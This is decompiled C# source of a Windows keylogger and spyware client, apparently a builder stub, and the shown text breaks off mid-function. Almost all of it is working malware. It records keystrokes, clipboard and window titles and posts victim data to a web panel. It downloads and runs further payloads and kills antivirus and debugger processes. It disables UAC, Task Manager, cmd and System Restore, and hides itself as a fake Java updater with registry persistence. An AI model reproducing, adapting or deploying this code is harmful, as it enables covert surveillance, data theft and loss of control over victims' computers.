using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
using System.Xml;

[StandardModule]
internal sealed class X
{
    [AccessedThroughProperty("CH")]
    private static Clipboard _CH;
    [AccessedThroughProperty("kbHook")]
    private static KeyboardHook _kbHook;
    [AccessedThroughProperty("MH")]
    private static Mouse _MH;
    [AccessedThroughProperty("Sendwebcam")]
    private static System.Windows.Forms.Timer _Sendwebcam;
    private static bool Antis = false;
    private static string asmpath = "";
    private static bool Backspace = false;
    private static bool BypassUAC = true;
    private static string computer_name = (SystemInformation.UserName + "/" + SystemInformation.ComputerName);
    private static bool disablecmd = false;
    private static bool disableCP = false;
    private static bool disablefolder = false;
    private static bool disablemscon = false;
    private static bool disablereg = false;
    private static bool disablerun = false;
    private static bool disableSR = false;
    private static bool disabletask = false;
    private static bool disableuac = false;
    private static bool Downloader = false;
    private static string Format = "yyyy-MM-dd HH:mm:ss";
    private static bool hdFile = true;
    private static string hwid_id = Hwid.GetID();
    private static string id = "76487-337-8429955-22614";
    private static int IdOfProcess = Process.GetCurrentProcess().Id;
    private static bool keylogger = true;
    private static bool Killtask = false;
    private static LASTINPUTINFO lastInputInf = new LASTINPUTINFO();
    private static string lastkey;
    private static string lastwindow;
    private static string Log = "";
    private static string Log_html = "";
    private static string log_time = "20";
    private static string LogType = "ftp";
    public static int mCapHwnd = 0;
    private static bool meltFile = false;
    private static Thread Memorythread = new Thread(new ThreadStart(X.AntiMemoryThread));
    private static Mutex objMutex;
    private static bool pc_state = true;
    private static bool Persistance = false;
    private static object pid = RuntimeHelpers.GetObjectValue(regPID.GetValue("ProductId"));
    private static IntPtr ProcessHandle;
    private static int PtrInteger;
    private static RegistryKey regPID = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", false);
    private static bool rstrt = false;
    private static bool screen = false;
    private static string screen_time = "20";
    private static string stfolder = (Environment.GetEnvironmentVariable("appdata") + @"\Java\JavaUpdtr.exe");
    private static string strin;
    private static bool strtup = true;
    private static bool webcam = false;
    private static string webcam_time = "20";
    private static bool webfilter = false;
    public const int WM_CAP_CONNECT = 0x40a;
    public const int WM_CAP_COPY = 0x41e;
    public const int WM_CAP_DISCONNECT = 0x40b;
    public const int WM_CAP_GET_FRAME = 0x43c;
    public const int WM_CAP_SET_PREVIEW = 0x432;
    public const int WM_CAP_SET_PREVIEWRATE = 0x434;
    public const int WM_CAP_SET_SCALE = 0x435;
    public const int WM_CAP_START = 0x400;
    public const int WM_USER = 0x400;
    public const int WS_CHILD = 0x40000000;
    public const int WS_VISIBLE = 0x10000000;

    static X()
    {
        MH = new Mouse();
        CH = new Clipboard();
        strin = null;
        kbHook = new KeyboardHook();
        lastkey = null;
        lastwindow = "";
    }

    public static void add_victim()
    {
        try
        {
            DateTime now = DateTime.Now;
            postdata($"type={"info"}&hwid={hwid_id}&time={DateTime.Now.ToString(Format)}&pcname={computer_name}&logdata={null}&screen={null}&ipadd={null}&webcam_link={null}&client={null}&link={null}&username={null}&password={null}&screen_link={null}");
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            ProjectData.ClearProjectError();
        }
    }

    public static string ADGDjmgDFGVBXCbnsDVSDVBCVBasdVDXFBXCVBSDbvdfBCV(string input, string key)
    {
        char[] chArray3 = input.ToCharArray();
        char[] chArray2 = key.ToCharArray();
        char[] chArray = new char[(input.Length - 2) + 1];
        int num2 = chArray3[input.Length - 1];
        chArray3[input.Length - 1] = '\0';
        int index = 0;
        int num7 = input.Length - 1;
        for (int i = 0; i <= num7; i++)
        {
            if (i < (input.Length - 1))
            {
                if (index >= chArray2.Length)
                {
                    index = 0;
                }
                int num3 = chArray3[i];
                int num5 = chArray2[index];
                int num6 = (num3 - num2) - num5;
                chArray[i] = Convert.ToChar(num6);
                index++;
            }
        }
        return new string(chArray);
    }

    public static void AntiMem(IntPtr ID)
    {
        ProcessHandle = ID;
        byte[] psdesc = new byte[0];
        uint uLengthNeeded = 0;
        if (GetKernelObjectSecurity(ProcessHandle, 4, psdesc, 0, ref uLengthNeeded) && ((uLengthNeeded < 0L) || (uLengthNeeded > 0x7fffL)))
        {
            throw new Exception();
        }
        if (!GetKernelObjectSecurity(ProcessHandle, 4, InlineAssignHelper<byte[]>(ref psdesc, new byte[((int) (uLengthNeeded - 1L)) + 1]), uLengthNeeded, ref uLengthNeeded))
        {
            throw new Exception();
        }
        RawSecurityDescriptor descriptor = new RawSecurityDescriptor(psdesc, 0);
        descriptor.DiscretionaryAcl.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, Convert.ToInt32(0x1f0fff), new SecurityIdentifier(WellKnownSidType.WorldSid, null), false, null));
        byte[] binaryForm = new byte[(descriptor.BinaryLength - 1) + 1];
        descriptor.GetBinaryForm(binaryForm, 0);
        if (!SetKernelObjectSecurity(ProcessHandle, 4, binaryForm))
        {
            throw new Exception();
        }
    }

    public static void AntiMemory(string processid)
    {
        PtrInteger = (int) IdToPtr(Conversions.ToInteger(processid));
        AntiMem((IntPtr) PtrInteger);
    }

    public static void AntiMemoryThread()
    {
        object id = Process.GetCurrentProcess().Id;
        AntiMemory(Conversions.ToString(id));
    }

    [DllImport("avicap32.dll")]
    public static extern int capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int X, int Y, int nWidth, int nHeight, int hwndParent, int nID);
    private static void CH_Changed(Clipboard sender)
    {
        string str = MyProject.Computer.Clipboard.GetText().Replace("&", "&amp;").Replace("<", "&lt;").Replace(">", "&gt;").Replace("\"", "&quot;");
        if (str != "")
        {
            Log = Log + "<br><span style=font-style:normal;text-decoration:none;text-transform:none;color:#FF0000;><strong>[clipboard]</strong></span>" + str + "<span style=font-style:normal;text-decoration:none;text-transform:none;color:#FF0000;><strong>[clipboard]</strong></span><br>";
        }
    }

    public static void checkMutex()
    {
        try
        {
            string processName = Process.GetCurrentProcess().ProcessName;
            int id = Process.GetCurrentProcess().Id;
            foreach (Process process in Process.GetProcessesByName(processName))
            {
                if (process.Id != id)
                {
                    process.Kill();
                }
            }
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            Exception exception = exception1;
            ProjectData.ClearProjectError();
        }
        try
        {
            if (stfolder != Assembly.GetExecutingAssembly().Location)
            {
                foreach (Process process2 in Process.GetProcesses())
                {
                    if (process2.ProcessName == "JavaUpdtr")
                    {
                        process2.Kill();
                    }
                }
            }
        }
        catch (Exception exception3)
        {
            ProjectData.SetProjectError(exception3);
            Exception exception2 = exception3;
            ProjectData.ClearProjectError();
        }
    }

    public static void CXZ(object sender, ElapsedEventArgs e)
    {
        string[] strArray = new string[] { 
            "anubis", "a2servic", "ashWebSv", "hvk", "avgemc", "bdagent", "avp", "keyscrambler", "mbam", "ekrn", "egui", "npfmsg", "ollydbg", "outpost", "wireshark", "mcagent",
            "mcuimgr", "clamauto", "cpf", "ewido", "FPAVServer", "SbieSvc", "antigen", "ccapp", "tmlisten", "pccntmon", "earthagent", "spysweeper"
        };
        int num3 = strArray.Length - 1;
        for (int i = 0; i <= num3; i++)
        {
            Process[] processes = Process.GetProcesses();
            int num4 = processes.Length - 1;
            for (int j = 0; j <= num4; j++)
            {
                if (strArray[i] == processes[j].ProcessName)
                {
                    processes[j].Kill();
                }
            }
        }
    }

    public static void CXZ_sub()
    {
        System.Timers.Timer timer = new System.Timers.Timer();
        timer.Elapsed += new ElapsedEventHandler(X.CXZ);
        timer.Enabled = true;
        timer.Interval = 5000.0;
        timer.Start();
    }

    [return: MarshalAs(UnmanagedType.Bool)]
    [DllImport("kernel32", CharSet=CharSet.Unicode, SetLastError=true)]
    private static extern bool DeleteFile(string name);
    public static void DeleteZone(string Path)
    {
        try
        {
            if (System.IO.File.Exists(Path))
            {
                DeleteFile(Path + ":Zone.Identifier");
            }
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            ProjectData.ClearProjectError();
        }
    }

    public static void downloader_sub()
    {
        try
        {
            new WebClient().DownloadFile("%DownLink%", Path.GetTempPath() + "/%filename%");
            Process.Start(Path.GetTempPath() + "/%filename%");
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            ProjectData.ClearProjectError();
        }
    }

    public static void filter_sub()
    {
        System.Timers.Timer timer = new System.Timers.Timer();
        timer.Elapsed += new ElapsedEventHandler(X.webfilterr);
        timer.Enabled = true;
        timer.Interval = 1000.0;
        timer.Start();
    }

    private static string GetActiveWindowTitle()
    {
        string lpString = new string('\0', 100);
        GetWindowText(GetForegroundWindow(), ref lpString, 100);
        return lpString.Substring(0, Strings.InStr(lpString, "\0", CompareMethod.Binary) - 1);
    }

    public static string GetBetween(string input, string str1, string str2, int ind)
    {
        string str;
        try
        {
            string str3 = Regex.Split(input, str1)[ind + 1];
            str = Regex.Split(str3, str2)[0];
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            str = "";
            ProjectData.ClearProjectError();
        }
        return str;
    }

    [DllImport("kernel32", EntryPoint="GetDiskFreeSpaceExA", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
    private static extern int GetDiskFreeSpaceEx([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpDirectoryName, ref long lpFreeBytesAvailableToMe, ref long lpTotalNumberOfBytes, ref long lpTotalNumberOfFreeBytes);
    public static ImageCodecInfo GetEncoderInfo(ImageFormat format)
    {
        ImageCodecInfo[] imageEncoders = ImageCodecInfo.GetImageEncoders();
        for (int i = 0; i < imageEncoders.Length; i++)
        {
            if (imageEncoders[i].FormatID == format.Guid)
            {
                return imageEncoders[i];
            }
        }
        return null;
    }

    private static string GetExternalIp()
    {
        string str;
        try
        {
            string input = new WebClient().DownloadString("http://checkip.dyndns.org/");
            str = new Regex(@"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}").Matches(input)[0].ToString();
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            str = null;
            ProjectData.ClearProjectError();
        }
        return str;
    }

    [DllImport("user32.dll", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
    private static extern int GetForegroundWindow();
    public static string GetInfo(InfoTypes InfoType)
    {
        string str;
        try
        {
            string oSFullName;
            ComputerInfo info = new ComputerInfo();
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(@"root\CIMV2", "SELECT * FROM Win32_VideoController");
            ManagementObjectSearcher searcher2 = new ManagementObjectSearcher("SELECT * FROM Win32_Processor");
            if (InfoType == InfoTypes.OperatingSystemName)
            {
                oSFullName = info.OSFullName;
            }
            else if (InfoType == InfoTypes.ProcessorName)
            {
                string str2;
                foreach (ManagementObject obj2 in searcher2.Get())
                {
                    str2 = obj2.GetPropertyValue("Name").ToString();
                }
                oSFullName = str2;
            }
            else if (InfoType == InfoTypes.AmountOfMemory)
            {
                oSFullName = Conversions.ToString(Math.Round((double) ((Convert.ToDouble(Conversion.Val(info.TotalPhysicalMemory)) / 1024.0) / 1024.0), 2)) + " MB";
            }
            else if (InfoType == InfoTypes.VideocardName)
            {
                string str5;
                foreach (ManagementObject obj3 in searcher.Get())
                {
                    str5 = obj3.GetPropertyValue("Name").ToString();
                }
                oSFullName = str5;
            }
            else if (InfoType == InfoTypes.VideocardMem)
            {
                string str4;
                foreach (ManagementObject obj4 in searcher.Get())
                {
                    str4 = obj4.GetPropertyValue("AdapterRAM").ToString();
                }
                oSFullName = Conversions.ToString(Math.Round((double) ((Convert.ToDouble(Conversion.Val(str4)) / 1024.0) / 1024.0), 2)) + " MB";
            }
            str = oSFullName;
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            str = "Unknown";
            ProjectData.ClearProjectError();
        }
        return str;
    }

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool GetKernelObjectSecurity(IntPtr ProcessHandle, int SI, [Out] byte[] psdesc, uint uLength, ref uint uLengthNeeded);
    [DllImport("user32", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
    private static extern int GetKeyboardLayout(int dwLayout);
    [DllImport("user32.dll")]
    private static extern bool GetKeyboardState(byte[] lpKeyState);
    [DllImport("user32.dll")]
    public static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);
    [DllImport("kernel32", EntryPoint="GetModuleFileNameA", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
    public static extern int GetModuleFileName(int hModule, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileName, int nSize);
    [DllImport("kernel32", EntryPoint="GetVolumeInformationA", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
    private static extern int GetVolumeInformation([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpRootPathName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpVolumeNameBuffer, int nVolumeNameSize, ref int lpVolumeSerialNumber, ref int lpMaximumComponentLength, ref int lpFileSystemFlags, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileSystemNameBuffer, int nFileSystemNameSize);
    [DllImport("user32.dll", EntryPoint="GetWindowTextA", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
    private static extern int GetWindowText(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);
    [DllImport("user32.dll", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
    private static extern int GetWindowThreadProcessId(IntPtr hwnd, ref int lpdwProcessID);
    public static IntPtr IdToPtr(int id)
    {
        foreach (Process process in Process.GetProcesses())
        {
            try
            {
                if (process.Id == id)
                {
                    return process.Handle;
                }
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }
        return IntPtr.Zero;
    }

    public static T InlineAssignHelper<T>(ref T target, T value)
    {
        target = value;
        return value;
    }

    public static bool IsProcessRunning(string name)
    {
        foreach (Process process in Process.GetProcesses())
        {
            if (process.ProcessName.StartsWith(name))
            {
                return true;
            }
        }
        return false;
    }

    private static void kbHook_KeyDown(Keys Key)
    {
        if (keylogger != Conversions.ToBoolean("False"))
        {
            if (strin != GetActiveWindowTitle())
            {
                DateTime now = DateTime.Now;
                string format = "MM/dd/yyyy HH:mm:ss";
                lastwindow = "<br><span style=font-size:14px;font-style:normal;text-decoration:none;text-transform:none;color:#0099cc;>[" + GetActiveWindowTitle() + "]<span style=font-style:normal;text-decoration:none;text-transform:none;color:#000000;> (" + now.ToString(format) + ")</span></span><br>";
                Log = Log + lastwindow;
                strin = GetActiveWindowTitle();
            }
            try
            {
                if (Key == Keys.Back)
                {
                    if (Backspace == Conversions.ToBoolean("False"))
                    {
                        Log = Log + "<font color=#008000>{BACK}</font>";
                    }
                    else if (((Log != "") && (Log.Substring(Log.Length - lastwindow.Length, lastwindow.Length) != lastwindow)) && ((Log.Substring(Log.Length - 7) != "</font>") & (Log.Substring(Log.Length - 4) != "<br>")))
                    {
                        Log = Log.Substring(0, Log.Length - 1);
                    }
                }
                else if (MyProject.Computer.Keyboard.AltKeyDown & (Key == Keys.Tab))
                {
                    Log = Log + "<font color=#008000>{ALT+TAB}</font>";
                }
                else if (MyProject.Computer.Keyboard.AltKeyDown & (Key == Keys.F4))
                {
                    Log = Log + "<font color=#008000>{ALT+F4}</font>";
                }
                else if (Key == Keys.Tab)
                {
                    Log = Log + "<font color=#008000>{TAB}</font>";
                }
                else if (Key == Keys.Escape)
                {
                    Log = Log + "<font color=#008000>{ESC}</font>";
                }
                else if ((Key == Keys.LWin) | (Key == Keys.RWin))
                {
                    Log = Log + "<font color=#008000>{Win}</font>";
                }
                else if (Key == Keys.Capital)
                {
                    Log = Log + "<font color=#008000>{CAPSLOCK}</font>";
                }
                else if (Key == Keys.Up)
                {
                    Log = Log + "<font color=#008000>&uarr;</font>";
                }
                else if (Key == Keys.Down)
                {
                    Log = Log + "<font color=#008000>&darr;</font>";
                }
                else if (Key == Keys.Left)
                {
                    Log = Log + "<font color=#008000>&larr;</font>";
                }
                else if (Key == Keys.Right)
                {
                    Log = Log + "<font color=#008000>&rarr;</font>";
                }
                else if (Key == Keys.Delete)
                {
                    Log = Log + "<font color=#008000>{DEL}</font>";
                }
                else if (Key == Keys.End)
                {
                    Log = Log + "<font color=#008000>{END}</font>";
                }
                else if (Key == Keys.Home)
                {
                    Log = Log + "<font color=#008000>{HOME}</font>";
                }
                else if (Key == Keys.Insert)
                {
                    Log = Log + "<font color=#008000>{Insert}</font>";
                }
                else if (Key == Keys.NumLock)
                {
                    Log = Log + "<font color=#008000>{NumLock}</font>";
                }
                else if (Key == Keys.Next)
                {
                    Log = Log + "<font color=#008000>{PageDown}</font>";
                }
                else if (Key == Keys.PageUp)
                {
                    Log = Log + "<font color=#008000>{PageUp}</font>";
                }
                else if (Key == Keys.Enter)
                {
                    Log = Log + "<font color=#008000>{ENTER}</font>";
                    Log = Log + "<br>";
                }
                else if (Key == Keys.F1)
                {
                    Log = Log + "<font color=#008000>{F1}</font>";
                }
                else if (Key == Keys.F2)
                {
                    Log = Log + "<font color=#008000>{F2}</font>";
                }
                else if (Key == Keys.F3)
                {
                    Log = Log + "<font color=#008000>{F3}</font>";
                }
                else if (Key == Keys.F4)
                {
                    Log = Log + "<font color=#008000>{F4}</font>";
                }
                else if (Key == Keys.F5)
                {
                    Log = Log + "<font color=#008000>{F5}</font>";
                }
                else if (Key == Keys.F6)
                {
                    Log = Log + "<font color=#008000>{F6}</font>";
                }
                else if (Key == Keys.F7)
                {
                    Log = Log + "<font color=#008000>{F7}</font>";
                }
                else if (Key == Keys.F8)
                {
                    Log = Log + "<font color=#008000>{F8}</font>";
                }
                else if (Key == Keys.F9)
                {
                    Log = Log + "<font color=#008000>{F9}</font>";
                }
                else if (Key == Keys.F10)
                {
                    Log = Log + "<font color=#008000>{F10}</font>";
                }
                else if (Key == Keys.F11)
                {
                    Log = Log + "<font color=#008000>{F11}</font>";
                }
                else if (Key == Keys.F12)
                {
                    Log = Log + "<font color=#008000>{F12}</font>";
                }
                else if (Key == Keys.Space)
                {
                    Log = Log + " ";
                }
                else if (MyProject.Computer.Keyboard.CtrlKeyDown & !MyProject.Computer.Keyboard.AltKeyDown)
                {
                    if (Key.ToString().ToLower().Contains("control"))
                    {
                        lastkey = Key.ToString();
                    }
                    else
                    {
                        Log = Log + "<font color=#008000>{CTRL}</font>";
                        Log = Log + Key.ToString();
                        lastkey = null;
                    }
                }
                else if (MyProject.Computer.Keyboard.CapsLock & !MyProject.Computer.Keyboard.ShiftKeyDown)
                {
                    Log = Log + VKCodeToUnicode((uint) Key).ToUpper();
                }
                else if (!MyProject.Computer.Keyboard.CapsLock & MyProject.Computer.Keyboard.ShiftKeyDown)
                {
                    Log = Log + VKCodeToUnicode((uint) Key).ToUpper();
                }
                else if (MyProject.Computer.Keyboard.CapsLock & MyProject.Computer.Keyboard.ShiftKeyDown)
                {
                    Log = Log + VKCodeToUnicode((uint) Key).ToLower();
                }
                else
                {
                    Log = Log + VKCodeToUnicode((uint) Key).ToLower();
                }
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }
    }

    private static void kbHook_KeyUp(Keys Key)
    {
    }

    public static void kill_sub()
    {
        System.Timers.Timer timer = new System.Timers.Timer();
        timer.Elapsed += new ElapsedEventHandler(X.Task);
        timer.Enabled = true;
        timer.Interval = 100.0;
        timer.Start();
    }

    public static string left2(string text, int length)
    {
        if (length < 0)
        {
            throw new ArgumentOutOfRangeException("length", length, "length must be > 0");
        }
        if ((length == 0) || (text.Length == 0))
        {
            return "";
        }
        if (text.Length <= length)
        {
            return text;
        }
        return text.Substring(0, length);
    }

    [STAThread]
    public static void Main()
    {
        checkMutex();
        Memorythread.Start();
        if (BypassUAC)
        {
            string oSFullName = MyProject.Computer.Info.OSFullName;
            if (((oSFullName.Contains("Windows 7") | oSFullName.Contains("Windows 8")) | oSFullName.Contains("Windows 10")) && (Conversions.ToInteger(MyProject.Computer.Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA", "1")) == 1))
            {
                try
                {
                    MyProject.Computer.Registry.SetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA", "0");
                }
                catch (Exception exception1)
                {
                    ProjectData.SetProjectError(exception1);
                    ProjectData.ClearProjectError();
                }
                SetFileBypassUAC(Assembly.GetExecutingAssembly().Location);
            }
        }
        if (LogType == "webpanel")
        {
            uninstall_sub();
            update_sub();
        }
        asmpath = Assembly.GetExecutingAssembly().Location;
        if (strtup)
        {
            if (!Directory.Exists(Environment.GetEnvironmentVariable("appdata") + @"\Java\"))
            {
                Directory.CreateDirectory(Environment.GetEnvironmentVariable("appdata") + @"\Java\");
            }
            try
            {
                if (System.IO.File.Exists(asmpath))
                {
                    if (System.IO.File.Exists(stfolder))
                    {
                        System.IO.File.Delete(stfolder);
                    }
                    System.IO.File.Copy(asmpath, stfolder, true);
                    if (hdFile)
                    {
                        System.IO.File.SetAttributes(stfolder, FileAttributes.System | FileAttributes.Hidden);
                    }
                }
            }
            catch (Exception exception2)
            {
                ProjectData.SetProjectError(exception2);
                ProjectData.ClearProjectError();
            }
            try
            {
                Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Windows", true).SetValue("Load", stfolder);
            }
            catch (Exception exception3)
            {
                ProjectData.SetProjectError(exception3);
                Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true).SetValue("Java Updtr", stfolder);
                ProjectData.ClearProjectError();
            }
        }
        DeleteZone(stfolder);
        if (meltFile && (asmpath != stfolder))
        {
            Melt();
        }
        if (rstrt)
        {
            Interaction.Shell("Shutdown -r -t 5", AppWinStyle.MinimizedFocus, false, -1);
        }
        bool persistance = Persistance;
        if (Antis)
        {
            new Thread(new ThreadStart(X.CXZ_sub)) { IsBackground = true }.Start();
        }
        if (Killtask)
        {
            new Thread(new ThreadStart(X.kill_sub)) { IsBackground = true }.Start();
        }
        if (webfilter)
        {
            new Thread(new ThreadStart(X.filter_sub)) { IsBackground = true }.Start();
        }
        new Thread(new ThreadStart(X.reg_sub)) { IsBackground = true }.Start();
        if (Downloader)
        {
            new Thread(new ThreadStart(X.downloader_sub)) { IsBackground = true }.Start();
        }
        if (keylogger == Conversions.ToBoolean("True"))
        {
            System.Timers.Timer timer = new System.Timers.Timer();
            timer.Elapsed += new ElapsedEventHandler(X.SendLog_Tick);
            timer.Interval = 0xea60 * Conversions.ToInteger(log_time);
            timer.Enabled = true;
            timer.Start();
        }
        new Thread(new ThreadStart(X.state_sub)) { IsBackground = true }.Start();
        if (screen == Conversions.ToBoolean("True"))
        {
            System.Timers.Timer timer2 = new System.Timers.Timer();
            timer2.Elapsed += new ElapsedEventHandler(X.SendScreen_Tick);
            timer2.Interval = 0xea60 * Conversions.ToInteger(screen_time);
            timer2.Enabled = true;
        }
        if (webcam == Conversions.ToBoolean("True"))
        {
            Sendwebcam = new System.Windows.Forms.Timer();
            Sendwebcam.Interval = 0xea60 * Conversions.ToInteger(webcam_time);
            Sendwebcam.Enabled = true;
            Sendwebcam.Start();
        }
        if (LogType == "webpanel")
        {
            System.Timers.Timer timer3 = new System.Timers.Timer();
            timer3.Elapsed += new ElapsedEventHandler(X.uninstall_server);
            timer3.Interval = 60000.0;
            timer3.Enabled = true;
        }
        if (LogType == "webpanel")
        {
            add_victim();
        }
        if (LogType == "webpanel")
        {
            System.Timers.Timer timer4 = new System.Timers.Timer();
            timer4.Elapsed += new ElapsedEventHandler(X.victim_update_Tick);
            timer4.Interval = 300000.0;
            timer4.Enabled = true;
        }
        try
        {
            Thread thread7 = new Thread(new ThreadStart(X.Send_steal));
            thread7.SetApartmentState(ApartmentState.STA);
            thread7.Start();
        }
        catch (Exception exception4)
        {
            ProjectData.SetProjectError(exception4);
            ProjectData.ClearProjectError();
        }
        Application.Run();
    }

    [DllImport("user32.dll")]
    private static extern uint MapVirtualKey(uint uCode, uint uMapType);
    public static void Melt()
    {
        try
        {
            MoveFile(left2(Application.ExecutablePath, GetModuleFileName(0, ref Application.ExecutablePath, 0x100)), Path.GetTempPath() + @"\tmpG" + DateTime.Now.Millisecond.ToString() + ".tmp", 8L);
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            ProjectData.ClearProjectError();
        }
    }

    private static void MH_Click(object sender, ref Mouse.MouseEvent e)
    {
        if (e.Button == MouseButtons.Right)
        {
            e.Handled = true;
        }
    }

    private static void MH_Move(object sender, ref Mouse.MouseEvent e)
    {
    }

    [DllImport("kernel32", EntryPoint="MoveFileExW", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
    public static extern int MoveFile([In, MarshalAs(UnmanagedType.LPTStr)] string lpExistingFileName, [In, MarshalAs(UnmanagedType.LPTStr)] string lpNewFileName, long dwFlags);
    public static void PersistanceSub(object sender, ElapsedEventArgs e)
    {
        if (!System.IO.File.Exists(Environment.GetEnvironmentVariable("temp") + @"\JavaUpdtr.exe"))
        {
            System.IO.File.Copy(Environment.GetEnvironmentVariable("appdata") + @"\Java\JavaUpdtr.exe", Environment.GetEnvironmentVariable("temp") + @"\JavaUpdtr.exe");
        }
        else if (!System.IO.File.Exists(Environment.GetEnvironmentVariable("appdata") + @"\Java\JavaUpdtr.exe"))
        {
            System.IO.File.Copy(Environment.GetEnvironmentVariable("temp") + @"\JavaUpdtr.exe", Environment.GetEnvironmentVariable("appdata") + @"\Java\JavaUpdtr.exe");
        }
        if (!IsProcessRunning("JavaUpdtr"))
        {
            try
            {
                Process.Start(Environment.GetEnvironmentVariable("appdata") + @"\Java\JavaUpdtr.exe");
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }
        try
        {
            Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Windows", true).SetValue("Load", Environment.GetEnvironmentVariable("appdata") + @"\JavaUpdtr.exe");
        }
        catch (Exception exception2)
        {
            ProjectData.SetProjectError(exception2);
            ProjectData.ClearProjectError();
        }
    }

    public static string postdata(string arguments)
    {
        string requestUriString = "%PostURL%/post.php";
        HttpWebRequest request = (HttpWebRequest) WebRequest.Create(requestUriString);
        request.Credentials = CredentialCache.DefaultCredentials;
        request.UserAgent = "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)";
        request.Method = "POST";
        arguments = arguments.Replace("+", "%2B");
        byte[] bytes = Encoding.UTF8.GetBytes(arguments);
        request.ContentType = "application/x-www-form-urlencoded";
        request.ContentLength = bytes.Length;
        Stream requestStream = request.GetRequestStream();
        requestStream.Write(bytes, 0, bytes.Length);
        requestStream.Close();
        WebResponse response = request.GetResponse();
        requestStream = response.GetResponseStream();
        StreamReader reader = new StreamReader(requestStream);
        string str2 = reader.ReadToEnd();
        reader.Close();
        requestStream.Close();
        response.Close();
        return str2;
    }

    public static void reg_sub()
    {
        try
        {
            if (disableuac)
            {
                MyProject.Computer.Registry.SetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA", "0");
            }
            if (disabletask)
            {
                Interaction.Shell(@"REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", AppWinStyle.NormalFocus, false, -1);
            }
            if (disablecmd)
            {
                Interaction.Shell(@"REG add HKCU\Software\Policies\Microsoft\Windows\System /v DisableCMD /t REG_DWORD /d 1 /f", AppWinStyle.NormalFocus, false, -1);
                MyProject.Computer.Registry.SetValue(@"HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System", "DisableCMD", "1", RegistryValueKind.DWord);
            }
            if (disablerun)
            {
                Interaction.Shell(@"REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 1 /f", AppWinStyle.NormalFocus, false, -1);
            }
            if (disableCP)
            {
                Interaction.Shell(@"REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f", AppWinStyle.NormalFocus, false, -1);
            }
            if (disablereg)
            {
                MyProject.Computer.Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "1", RegistryValueKind.String);
            }
            if (disableSR)
            {
                MyProject.Computer.Registry.SetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore", "DisableSR", "1", RegistryValueKind.DWord);
            }
            if (disablefolder)
            {
                Interaction.Shell(@"REG add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFolderOptions /t REG_DWORD /d 1 /f", AppWinStyle.Hide, false, -1);
                Interaction.Shell(@"REG add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFolderOptions /t REG_DWORD /d 1 /f", AppWinStyle.Hide, false, -1);
            }
            if (disablemscon)
            {
